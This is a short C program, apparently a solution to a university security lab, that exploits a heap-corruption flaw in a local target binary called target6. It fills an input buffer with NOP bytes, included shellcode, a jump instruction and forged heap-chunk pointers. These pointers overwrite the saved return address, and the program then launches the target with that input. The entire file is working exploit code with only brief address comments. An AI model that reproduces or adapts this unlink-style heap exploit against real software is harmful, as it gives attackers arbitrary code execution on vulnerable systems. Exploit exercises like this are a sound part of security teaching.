#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

int main(void)
{
    char *args[3];
    char *env[1];

    /* p = 0x104ec48 */
    /* q = 0x104ec98 */
    /* sizeof(CHUNK) = 8 */

    uint32_t input[33];
    memset(input, 0x90, sizeof(input));
    memcpy(input + 2, shellcode, sizeof(shellcode) - 1);

    input[0] =  0x010106eb; /* eb 06: jmp 8 */
    input[1] =  0x01010101;

    input[18] = 0x0104ec48; /* q left  - shellcode */
    input[19] = 0x40a4fea8; /* q right - saved rip */

    args[0] = TARGET; 
    args[1] = (char *) input;
    args[2] = NULL;

    env[0] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
